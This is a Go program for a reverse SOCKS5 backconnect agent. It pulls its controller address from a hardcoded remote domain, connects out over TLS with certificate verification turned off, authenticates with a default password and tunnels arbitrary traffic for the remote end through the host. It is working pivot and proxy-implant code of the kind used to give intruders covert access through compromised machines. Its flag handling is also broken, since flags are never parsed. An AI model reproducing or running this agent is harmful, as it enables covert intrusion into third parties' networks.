package main

import (
	"crypto/tls"
	"flag"
	"github.com/armon/go-socks5"
	"github.com/hashicorp/yamux"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"time"
)

var agentpassword string

func getServerAddress() string {
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Get("https://ruskiykorablidinahuy.today/spoint.html")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	return strings.TrimSpace(string(body))
}

func connectForSocks(tlsenable bool, address string) error {
	var session *yamux.Session
	server, err := socks5.New(&socks5.Config{})
	if err != nil {
		return err
	}

	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	var conn net.Conn

	log.Println("Connecting to far end")
	if tlsenable {
		conn, err = tls.Dial("tcp", address, conf)
	} else {
		conn, err = net.Dial("tcp", address)
	}
	if err != nil {
		return err
	}

	log.Println("Starting client")
	conn.Write([]byte(agentpassword))
	//time.Sleep(time.Second * 1)
	session, err = yamux.Server(conn, nil)
	if err != nil {
		return err
	}

	for {
		stream, err := session.Accept()
		log.Println("Accepting stream")
		if err != nil {
			return err
		}
		log.Println("Passing off to socks5")
		go func() {
			err = server.ServeConn(stream)
			if err != nil {
				log.Println(err)
			}
		}()
	}
}

func main(){
	server := *flag.String("server", "", "server address:port. or use default")
	agentpassword = *flag.String("pass", "SuperSecretPassword", "Connect password")
	recn := flag.Int("recn", 3, "reconnection limit")
	rect := flag.Int("rect", 30, "reconnection delay")

	if server == "" {
		server = getServerAddress()
	}

	println("connecting to " + server)

	if *recn > 0 {
		for i := 1; i <= *recn; i++ {
			log.Printf("Connecting to the far end. Try %d of %d", i, *recn)
			error1 := connectForSocks(true, server)
			log.Print(error1)
			log.Printf("Sleeping for %d sec...", *rect)
			tsleep := time.Second * time.Duration(*rect)
			time.Sleep(tsleep)
		}

	} else {
		for {
			log.Printf("Reconnecting to the far end... ")
			error1 := connectForSocks(true, server)
			log.Print(error1)
			log.Printf("Sleeping for %d sec...", *rect)
			tsleep := time.Second * time.Duration(*rect)
			time.Sleep(tsleep)
		}
	}

	log.Fatal("Ending...")
}